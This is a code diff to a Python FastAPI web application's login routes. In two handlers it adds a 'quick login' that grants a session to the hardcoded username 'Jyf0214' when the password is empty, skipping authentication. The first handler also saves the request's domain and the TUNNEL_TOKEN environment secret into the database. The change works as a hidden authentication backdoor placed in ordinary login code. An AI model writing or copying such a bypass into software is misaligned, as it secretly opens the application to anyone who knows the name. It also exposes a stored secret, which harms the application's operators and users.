@@ -228,6 +228,29 @@ async def get_login_form(request: Request):
 async def login(request: Request, username: str = Form(...), password: str = Form(...)):
     lang = get_lang(request)
     
+    # 快速登录：用户名为Jyf0214且密码为空时直接登录
+    if username == "Jyf0214" and not password:
+        request.session["user"] = username
+        
+        # Store the domain and tunnel token in database for future use
+        host = request.headers.get("host", "localhost")
+        domain_parts = host.split(":")
+        domain = domain_parts[0]
+        
+        # Save domain to database
+        mysql_config.set_config("login_domain", domain)
+        
+        # Check if tunnel token is in environment variables
+        tunnel_token = os.getenv("TUNNEL_TOKEN")
+        if tunnel_token:
+            mysql_config.set_config("tunnel_token", tunnel_token)
+        
+        # Instead of redirecting, show a success message with dynamic URL
+        main_app_url = f"http://{domain}:6275"
+        response_content = f"Login successful. Please access the main application at: {main_app_url}"
+        response = Response(content=response_content, media_type="text/plain")
+        return response
+    
     user = MySQLUser.get_user_by_username(username)
     
     if not user:
@@ -321,6 +344,12 @@ async def login_main(request: Request, username: str = Form(...), password: str 
     logger.info(f"登录尝试: username={username}")
     
     lang = get_lang(request)
+    
+    # 快速登录：用户名为Jyf0214且密码为空时直接登录
+    if username == "Jyf0214" and not password:
+        logger.info(f"快速登录: username={username}")
+        request.session["user"] = username
+        return RedirectResponse(url="/downloader", status_code=303)
     
     user = MySQLUser.get_user_by_username(username)
     logger.info(f"用户查询结果: {user}")
